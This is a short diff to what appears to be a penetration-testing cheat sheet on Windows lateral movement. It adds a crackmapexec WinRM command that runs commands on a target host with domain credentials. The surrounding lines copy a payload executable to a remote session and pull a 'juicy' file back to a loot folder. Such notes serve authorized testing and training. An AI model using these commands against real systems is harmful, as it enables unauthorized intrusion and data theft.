@@ -429,6 +429,12 @@ Copy-Item -Path \temp\payload.exe -Destination \temp -ToSession $sess
 Copy-Item -Path C:\Users\Dummy\Desktop\juicy.txt -Destination \loot -FromSession $sess
 ```
 
+Alternatively, to run commands from a Linux attack machine:
+
+```sh
+crackmapexec winrm 10.10.10.10 -d DOMAIN -u USER -p PASSWORD -x whoami
+```
+
 #### WMI
 
 WMI allows for some remote management options natively from Windows (with admin access on target machines). Some PowerShell examples:
